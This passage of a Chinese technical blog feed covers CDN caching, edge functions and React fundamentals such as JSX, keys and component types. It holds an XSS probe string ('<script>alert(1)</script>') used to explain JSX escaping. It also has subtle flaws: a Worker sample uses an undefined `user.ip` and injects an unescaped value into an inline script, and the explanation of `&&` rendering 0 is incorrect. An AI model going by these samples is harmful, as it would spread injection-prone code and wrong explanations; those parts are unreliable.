align="left">主动失效缓存</td></tr></tbody></table><p><strong>缓存生命周期管理</strong></p><pre class="mermaid">sequenceDiagram  participant Client  participant CDN  participant Origin    Client->>CDN: 请求 /main.js  alt 首次请求    CDN->>Origin: MISS (回源获取)    Origin->>CDN: 200 OK + Cache-Control: max-age=3600    CDN->>Client: 返回资源 (存储缓存)  else 缓存有效    CDN->>Client: HIT (直接返回)  else 缓存过期    CDN->>Origin: If-Modified-Since    alt 内容未变      Origin->>CDN: 304 Not Modified      CDN->>Client: HIT (更新有效期)    else 内容已变      Origin->>CDN: 200 OK (新内容)      CDN->>Client: 返回新资源    end  end</pre><h3 id="边缘函数：Cloudflare-Workers-Vercel-Edge-Functions"><a href="#边缘函数：Cloudflare-Workers-Vercel-Edge-Functions" class="headerlink" title="边缘函数：Cloudflare Workers &#x2F; Vercel Edge Functions"></a>边缘函数：Cloudflare Workers &#x2F; Vercel Edge Functions</h3><p><strong>核心概念与架构演进</strong></p><pre class="mermaid">graph TB  A[传统架构] --> B[客户端请求]  B --> C[云服务器]  C --> D[数据库]  D --> C  C --> B    E[边缘计算架构] --> F[客户端请求]  F --> G[边缘节点]  G --> H[边缘函数执行]  H -->|直接响应| F  H -->|必要数据| I[边缘缓存/数据库]</pre><p>技术定义：</p><ul><li>边缘函数：在全球分布式CDN节点上运行的JavaScript&#x2F;WASM函数</li><li>执行位置：距离用户最近的网络边缘节点（通常&lt;50ms）</li><li>核心价值：<ul><li>超低延迟响应（减少往返源站时间）</li><li>全球分布式执行</li><li>零服务器运维</li></ul></li></ul><p><strong>工作原理</strong></p><table><thead><tr><th align="left">特性</th><th align="left">Cloudflare Workers</th><th align="left">Vercel Edge Functions</th></tr></thead><tbody><tr><td align="left">运行时</td><td align="left">V8 Isolates (Chrome引擎)</td><td align="left">V8 Isolates</td></tr><tr><td align="left">编程语言</td><td align="left">JavaScript&#x2F;WASM&#x2F;Rust</td><td align="left">JavaScript&#x2F;TypeScript</td></tr><tr><td align="left">部署单位</td><td align="left">单个脚本 (.js&#x2F;.ts)</td><td align="left">函数文件 (&#x2F;api&#x2F;*.ts)</td></tr><tr><td align="left">触发器</td><td align="left">所有HTTP请求</td><td align="left">按路由匹配的请求</td></tr><tr><td align="left">本地开发</td><td align="left">wrangler dev</td><td align="left">vercel dev</td></tr><tr><td align="left">持久存储</td><td align="left">Workers KV &#x2F; D1 &#x2F; R2</td><td align="left">Vercel KV &#x2F; Postgres Edge</td></tr></tbody></table><p><strong>核心应用场景</strong></p><p>(1) 动态内容优化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Cloudflare Worker示例：个性化内容注入</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-keyword">async</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-params">request</span>) &#123;<br>    <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(request.<span class="hljs-property">url</span>)<br>    <br>    <span class="hljs-comment">// 从边缘KV读取用户偏好</span><br>    <span class="hljs-keyword">const</span> pref = <span class="hljs-keyword">await</span> <span class="hljs-variable constant_">KV</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">`pref:<span class="hljs-subst">$&#123;user.ip&#125;</span>`</span>, <span class="hljs-string">&#x27;json&#x27;</span>)<br>    <br>    <span class="hljs-comment">// 修改HTML响应</span><br>    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url)<br>    <span class="hljs-keyword">const</span> html = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">text</span>()<br>    <span class="hljs-keyword">const</span> newHtml = html.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;&lt;/body&gt;&#x27;</span>, <span class="hljs-string">`&lt;script&gt;THEME=<span class="hljs-subst">$&#123;pref.theme&#125;</span>&lt;/script&gt;&lt;/body&gt;`</span>)<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(newHtml, res)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) 安全防护</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Cloudflare Worker：API攻击防护</span><br><span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> request = event.<span class="hljs-property">request</span><br>  <span class="hljs-keyword">const</span> ip = request.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;CF-Connecting-IP&#x27;</span>)<br>  <br>  <span class="hljs-comment">// 检查IP信誉库</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isMaliciousIP</span>(ip)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">&#x27;Blocked&#x27;</span>, &#123; <span class="hljs-attr">status</span>: <span class="hljs-number">403</span> &#125;)<br>  &#125;<br>  <br>  <span class="hljs-comment">// 验证JWT令牌</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">validateToken</span>(request)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">&#x27;Unauthorized&#x27;</span>, &#123; <span class="hljs-attr">status</span>: <span class="hljs-number">401</span> &#125;)<br>  &#125;<br>  <br>  event.<span class="hljs-title function_">respondWith</span>(<span class="hljs-title function_">handleRequest</span>(request))<br>&#125;)<br></code></pre></td></tr></table></figure><p><strong>开发部署流程</strong></p><pre class="mermaid">flowchart LR  A[代码开发] --> B[本地测试]  B --> C[wrangler publish]  C --> D[全球部署]  D --> E[自动流量切换]  E --> F[实时监控]</pre><p>典型部署命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装CLI</span><br>npm install -g wrangler<br><br><span class="hljs-comment"># 登录认证</span><br>wrangler login<br><br><span class="hljs-comment"># 发布Worker</span><br>wrangler publish src/index.js<br></code></pre></td></tr></table></figure><p><strong>典型应用架构</strong></p><pre class="mermaid">graph LR  A[客户端] --> B[边缘节点]  B --> C{路由判断}  C -->|静态资源| D[边缘缓存]  C -->|API请求| E[边缘函数]  E --> F[边缘KV数据库]  E --> G[边缘SQLite]  E -->|复杂查询| H[传统云数据库]  D & E --> A</pre><h1 id="六、进阶场景优化"><a href="#六、进阶场景优化" class="headerlink" title="六、进阶场景优化"></a>六、进阶场景优化</h1><h2 id="6-1-移动端专项"><a href="#6-1-移动端专项" class="headerlink" title="6.1 移动端专项"></a>6.1 移动端专项</h2><h3 id="首屏秒开方案：离线包、预请求、VAP（视觉动画进度）"><a href="#首屏秒开方案：离线包、预请求、VAP（视觉动画进度）" class="headerlink" title="首屏秒开方案：离线包、预请求、VAP（视觉动画进度）"></a>首屏秒开方案：离线包、预请求、VAP（视觉动画进度）</h3><h3 id="手势性能优化（避免阻塞滚动）"><a href="#手势性能优化（避免阻塞滚动）" class="headerlink" title="手势性能优化（避免阻塞滚动）"></a>手势性能优化（避免阻塞滚动）</h3><h2 id="6-2-复杂动画性能"><a href="#6-2-复杂动画性能" class="headerlink" title="6.2 复杂动画性能"></a>6.2 复杂动画性能</h2><h3 id="CSS动画-vs-JS动画（RAF）"><a href="#CSS动画-vs-JS动画（RAF）" class="headerlink" title="CSS动画 vs JS动画（RAF）"></a>CSS动画 vs JS动画（RAF）</h3><h3 id="FLIP动画技术（First-Last-Invert-Play）"><a href="#FLIP动画技术（First-Last-Invert-Play）" class="headerlink" title="FLIP动画技术（First, Last, Invert, Play）"></a>FLIP动画技术（First, Last, Invert, Play）</h3><h2 id="6-3-低端设备适配"><a href="#6-3-低端设备适配" class="headerlink" title="6.3 低端设备适配"></a>6.3 低端设备适配</h2><h3 id="代码降级策略（Dynamic-Polyfill）"><a href="#代码降级策略（Dynamic-Polyfill）" class="headerlink" title="代码降级策略（Dynamic Polyfill）"></a>代码降级策略（Dynamic Polyfill）</h3><h3 id="内存占用量控制（-100MB）"><a href="#内存占用量控制（-100MB）" class="headerlink" title="内存占用量控制（&lt; 100MB）"></a>内存占用量控制（&lt; 100MB）</h3><h1 id="七、性能优化流程"><a href="#七、性能优化流程" class="headerlink" title="七、性能优化流程"></a>七、性能优化流程</h1><h2 id="7-1-性能审计方法论"><a href="#7-1-性能审计方法论" class="headerlink" title="7.1 性能审计方法论"></a>7.1 性能审计方法论</h2><h3 id="制定性能预算（Performance-Budget）"><a href="#制定性能预算（Performance-Budget）" class="headerlink" title="制定性能预算（Performance Budget）"></a>制定性能预算（Performance Budget）</h3><h3 id="RAIL模型（Response-Animation-Idle-Load）"><a href="#RAIL模型（Response-Animation-Idle-Load）" class="headerlink" title="RAIL模型（Response, Animation, Idle, Load）"></a>RAIL模型（Response, Animation, Idle, Load）</h3><h2 id="7-2-灰度与度量"><a href="#7-2-灰度与度量" class="headerlink" title="7.2 灰度与度量"></a>7.2 灰度与度量</h2><h3 id="A-B测试性能方案"><a href="#A-B测试性能方案" class="headerlink" title="A&#x2F;B测试性能方案"></a>A&#x2F;B测试性能方案</h3><h3 id="性能指标自动化报警"><a href="#性能指标自动化报警" class="headerlink" title="性能指标自动化报警"></a>性能指标自动化报警</h3><h1 id="八、新兴技术方向"><a href="#八、新兴技术方向" class="headerlink" title="八、新兴技术方向"></a>八、新兴技术方向</h1><h2 id="8-1-现代浏览器API"><a href="#8-1-现代浏览器API" class="headerlink" title="8.1 现代浏览器API"></a>8.1 现代浏览器API</h2><h3 id="IntersectionObserver-懒加载"><a href="#IntersectionObserver-懒加载" class="headerlink" title="IntersectionObserver 懒加载"></a>IntersectionObserver 懒加载</h3><h3 id="ResizeObserver-替代滚动监听"><a href="#ResizeObserver-替代滚动监听" class="headerlink" title="ResizeObserver 替代滚动监听"></a>ResizeObserver 替代滚动监听</h3><h3 id="Priority-Hints-实验性"><a href="#Priority-Hints-实验性" class="headerlink" title="Priority Hints (实验性)"></a>Priority Hints (实验性)</h3><h2 id="8-2-Web性能标准演进"><a href="#8-2-Web性能标准演进" class="headerlink" title="8.2 Web性能标准演进"></a>8.2 Web性能标准演进</h2><h3 id="WebAssembly-高性能模块"><a href="#WebAssembly-高性能模块" class="headerlink" title="WebAssembly 高性能模块"></a>WebAssembly 高性能模块</h3><h3 id="WebGPU-图形计算加速"><a href="#WebGPU-图形计算加速" class="headerlink" title="WebGPU 图形计算加速"></a>WebGPU 图形计算加速</h3>]]></content>
    
    
    <categories>
      
      <category>性能优化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>性能优化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>React 知识体系专题学习</title>
    <link href="/2025/06/23/React%20Study%20Notes/"/>
    <url>/2025/06/23/React%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章：React-基础与核心概念"><a href="#第一章：React-基础与核心概念" class="headerlink" title="第一章：React 基础与核心概念"></a>第一章：React 基础与核心概念</h1><h2 id="1-1-React-简介与设计哲学（组件化、声明式-UI）"><a href="#1-1-React-简介与设计哲学（组件化、声明式-UI）" class="headerlink" title="1.1 React 简介与设计哲学（组件化、声明式 UI）"></a>1.1 React 简介与设计哲学（组件化、声明式 UI）</h2><h3 id="基础概念概述"><a href="#基础概念概述" class="headerlink" title="基础概念概述"></a>基础概念概述</h3><p><strong>React 是什么？</strong></p><p>Facebook 推出的用于构建用户界面的 JavaScript 库，核心解决 UI 组件化开发问题。</p><p><strong>两大设计哲学</strong></p><ul><li>组件化 (Component-Based)：将 UI 拆分为独立、可复用的代码单元（组件），每个组件管理自身状态与逻辑。<em>示例：<code>&lt;Button /&gt;</code>, <code>&lt;Card /&gt;</code> 等</em></li><li>声明式 UI (Declarative)：开发者只需描述“UI 应该是什么样子”（What），而非“如何更新到该状态”（How）。<em>对比命令式：直接操作 DOM vs. 返回 JSX 描述结构</em></li></ul><span id="more"></span><h3 id="深入原理与面试考点"><a href="#深入原理与面试考点" class="headerlink" title="深入原理与面试考点"></a>深入原理与面试考点</h3><p><strong>组件化背后的核心思想</strong></p><table><thead><tr><th align="left">特性</th><th align="left">说明</th><th align="left">面试举例</th></tr></thead><tbody><tr><td align="left">封装性</td><td align="left">组件内部状态&#x2F;逻辑对外隐藏，仅通过 Props 通信</td><td align="left">“为何 React 推荐单向数据流？”</td></tr><tr><td align="left">组合性</td><td align="left">通过嵌套组件构建复杂 UI（如 <code>&lt;Form&gt;&lt;Input/&gt;&lt;Button/&gt;&lt;/Form&gt;</code>）</td><td align="left">“如何设计可复用的高阶组件？”</td></tr><tr><td align="left">复用性</td><td align="left">同一组件在不同场景重复使用</td><td align="left">“受控组件与非受控组件适用场景差异？”</td></tr></tbody></table><p><strong>声明式 UI 的底层实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 声明式写法（What）</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(count + 1)&#125;&gt;&#123;count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// 对应的命令式逻辑（How）</span><br><span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;button&#x27;</span>);<br><span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;<br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  count++;<br>  button.<span class="hljs-property">textContent</span> = count; <span class="hljs-comment">// 需手动更新 DOM</span><br>&#125;);<br></code></pre></td></tr></table></figure><p>关键优势：</p><ul><li>避免直接操作 DOM → 减少代码复杂度与潜在 Bug</li><li>与状态绑定 → UI 自动随状态更新（通过 Virtual DOM 协调）</li></ul><p><strong>虚拟 DOM (Virtual DOM) 的角色</strong></p><pre class="mermaid">graph LRA[组件状态变化] --> B{生成新 Virtual DOM}B --> C[对比新旧 Virtual DOM]C --> D[计算最小 DOM 变更]D --> E[批量更新真实 DOM]</pre><p>设计哲学关联：声明式 UI 依赖 Virtual DOM 实现高效的 “状态到 UI 的映射”，开发者无需关注更新过程。</p><h3 id="面试话术技巧"><a href="#面试话术技巧" class="headerlink" title="面试话术技巧"></a>面试话术技巧</h3><p><strong>Q：为什么 React 采用声明式而非命令式？</strong></p><p>声明式让代码更专注于业务逻辑的描述（What），将底层 DOM 操作交给 React 的 Virtual DOM 协调机制处理。这带来三方面优势：</p><ol><li>可维护性：状态变化自动触发 UI 更新，避免手动 DOM 操作导致的逻辑分散</li><li>性能优化：React 通过 Diff 算法批量 DOM 更新，减少重绘开销</li><li>开发体验：更接近自然思维模式的 UI 构建方式，提升开发效率”</li></ol><h3 id="延伸考点"><a href="#延伸考点" class="headerlink" title="延伸考点"></a>延伸考点</h3><ul><li>JSX 的本质：声明式 UI 的语法糖（编译为 React.createElement()）</li><li>组件化与设计模式：复合组件 (Compound Components)、容器&#x2F;展示组件等</li></ul><h2 id="1-2-JSX-语法与渲染逻辑（表达式、条件渲染、列表渲染）"><a href="#1-2-JSX-语法与渲染逻辑（表达式、条件渲染、列表渲染）" class="headerlink" title="1.2 JSX 语法与渲染逻辑（表达式、条件渲染、列表渲染）"></a>1.2 JSX 语法与渲染逻辑（表达式、条件渲染、列表渲染）</h2><h3 id="基础概念简述"><a href="#基础概念简述" class="headerlink" title="基础概念简述"></a>基础概念简述</h3><p><strong>JSX 是什么？</strong></p><p>JavaScript 语法扩展，允许在 JavaScript 中编写类似 HTML 的结构（语法糖）</p><p><strong>三大核心功能</strong></p><ul><li>表达式嵌入：{ } 包裹任意 JavaScript 表达式</li><li>条件渲染：三元运算符 ? : 或 &amp;&amp; 短路运算</li><li>列表渲染：map() + key 属性生成元素列表</li></ul><h3 id="核心机制与深度原理"><a href="#核心机制与深度原理" class="headerlink" title="核心机制与深度原理"></a>核心机制与深度原理</h3><p><strong>JSX 编译原理（Babel 转换过程）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 原始 JSX</span><br><span class="hljs-keyword">const</span> element = <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>Hello &#123;name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br><br><span class="hljs-comment">// Babel 编译后（React 17+ 无需显式引入 React）</span><br><span class="hljs-keyword">import</span> &#123; jsx <span class="hljs-keyword">as</span> _jsx &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react/jsx-runtime&quot;</span>;<br><span class="hljs-keyword">const</span> element = <span class="hljs-title function_">_jsx</span>(<span class="hljs-string">&quot;div&quot;</span>, &#123;<br>  <span class="hljs-attr">className</span>: <span class="hljs-string">&quot;container&quot;</span>,<br>  <span class="hljs-attr">children</span>: [<span class="hljs-string">&quot;Hello &quot;</span>, name]<br>&#125;);<br></code></pre></td></tr></table></figure><p>关键点：</p><ul><li>JSX 本质是 React.createElement(type, props, children) 的语法糖</li><li>每个 JSX 元素会被编译为 虚拟 DOM 对象（包含 type, props, key 等属性）</li></ul><p><strong>表达式嵌入的运行时机制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Welcome</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-comment">// 表达式执行发生在组件 render 阶段</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>当前用户: &#123;props.user ?? &#x27;游客&#x27;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意事项：</p><ul><li>表达式内不能使用语句（如 if&#x2F;for）</li><li>表达式结果类型自动转换：<ul><li>undefined&#x2F;null&#x2F;true&#x2F;false → 不渲染</li><li>数组 → 展开渲染（需包含有效元素）</li><li>对象 → 抛出错误（除特殊对象如 ReactElement）</li></ul></li></ul><p><strong>条件渲染的底层实现策略</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 方案1：三元表达式（适合简单分支）</span><br>&#123; isLoggedIn ? <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">LogoutButton</span> /&gt;</span></span> : <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">LoginButton</span> /&gt;</span></span> &#125;<br><br><span class="hljs-comment">// 方案2：&amp;&amp; 短路（适合单分支）</span><br>&#123; hasUnread &amp;&amp; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Badge</span> <span class="hljs-attr">count</span>=<span class="hljs-string">&#123;unreadCount&#125;</span> /&gt;</span></span> &#125;<br><br><span class="hljs-comment">// 方案3：立即执行函数（复杂逻辑 - 不推荐）</span><br>&#123; (<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (conditionA) <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ComponentA</span> /&gt;</span></span>;<br>    <span class="hljs-keyword">if</span> (conditionB) <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ComponentB</span> /&gt;</span></span>;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Fallback</span> /&gt;</span></span>;<br>  &#125;)() <br>&#125;<br></code></pre></td></tr></table></figure><p>性能优化：条件变化时，React 通过 Diff 算法 复用相同子组件（按组件位置比对）</p><p><strong>列表渲染的 key 机制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> todoItems = todos.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;todo.id&#125;</span>&gt;</span>  // ⭐ 关键点：key 必须是稳定唯一标识</span><br><span class="language-xml">    &#123;todo.text&#125;</span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br>));<br></code></pre></td></tr></table></figure><p>无 key 的隐患：</p><ul><li>列表顺序变化时引发组件状态错乱（如输入框内容错位）</li><li>性能下降：全量比对子元素（时间复杂度 O(n²)）</li></ul><h3 id="高频面试题与破解技巧"><a href="#高频面试题与破解技巧" class="headerlink" title="高频面试题与破解技巧"></a>高频面试题与破解技巧</h3><p><strong>Q：为什么 JSX 中 <code>&#123;boolean &amp;&amp; &lt;Component/&gt;&#125;</code> 可能渲染 0？</strong></p><p>true &amp;&amp; jsx 返回 jsx，但 false &amp;&amp; jsx 返回 false → React 将 false 渲染为空白占位符（类似 null），导致 DOM 中出现空文本节点。</p><p>解决方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 转换为 null 避免空节点</span><br>&#123; shouldRender &amp;&amp; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Component</span> /&gt;</span></span> || <span class="hljs-literal">null</span> &#125;<br></code></pre></td></tr></table></figure><p><strong>Q：列表渲染为什么不能用 index 作为 key？</strong></p><p>当列表发生增删或排序时：</p><ul><li>index 变化导致组件被意外销毁重建（状态丢失）</li><li>Diff 算法无法准确定位节点变化</li><li>正确做法：使用数据唯一 ID（如 todo.id）</li></ul><p><strong>Q：JSX 如何防止 XSS 攻击？</strong></p><p>JSX 在执行表达式插入时自动进行转义处理：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> title = <span class="hljs-string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;title&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span> <br><span class="hljs-comment">// 渲染为：&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</span><br></code></pre></td></tr></table></figure><p>例外：dangerouslySetInnerHTML 需手动防范</p><h2 id="1-3-组件基础（函数组件-vs-类组件）"><a href="#1-3-组件基础（函数组件-vs-类组件）" class="headerlink" title="1.3 组件基础（函数组件 vs. 类组件）"></a>1.3 组件基础（函数组件 vs. 类组件）</h2><h3 id="基础概念概述-1"><a href="#基础概念概述-1" class="headerlink" title="基础概念概述"></a>基础概念概述</h3><table><thead><tr><th align="left">特性</th><th align="left">函数组件</th><th align="left">类组件</th></tr></thead><tbody><tr><td align="left">定义方式</td><td align="left">JavaScript 函数</td><td align="left">ES6 class 继承 React.Component</td></tr><tr><td align="left">状态管理</td><td align="left">useState Hook (React 16.8+)</td><td align="left">this.state + setState</td></tr><tr><td align="left">生命周期</td><td align="left">useEffect Hook</td><td align="left">生命周期方法（componentDidMount等）</td></tr><tr><td align="left">代码量</td><td align="left">更简洁</td><td align="left">相对冗长</td></tr><tr><td align="left">推荐场景</td><td align="left">现代 React 开发首选</td><td align="left">遗留项目或需要 Error Boundaries 时</td></tr></tbody></table><h3 id="核心机制与差异深度解析"><a href="#核心机制与差异深度解析" class="headerlink" title="核心机制与差异深度解析"></a>核心机制与差异深度解析</h3><p><strong>渲染逻辑本质区别</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 函数组件：纯函数执行</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Welcome</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;props.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// 类组件：实例化后调用 render 方法</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Welcome</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;this.props.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>关键差异：</p><ul><li>函数组件：直接返回 JSX，每次渲染都是独立函数调用</li><li>类组件：通过 实例化 → 调用 render() 返回 JSX，实例在更新间保持</li></ul><p><strong>状态管理的底层实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 函数组件：闭包存储状态（Hook 链表结构）</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>); <br>  <span class="hljs-comment">// React 内部通过顺序索引关联状态</span><br>&#125;<br><br><span class="hljs-comment">// 类组件：实例属性存储状态</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> &#125;;<br>  <br>  increment = <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>状态更新差异：</p><table><thead><tr><th align="left">特性</th><th align="left">函数组件</th><th align="left">类组件</th></tr></thead><tbody><tr><td 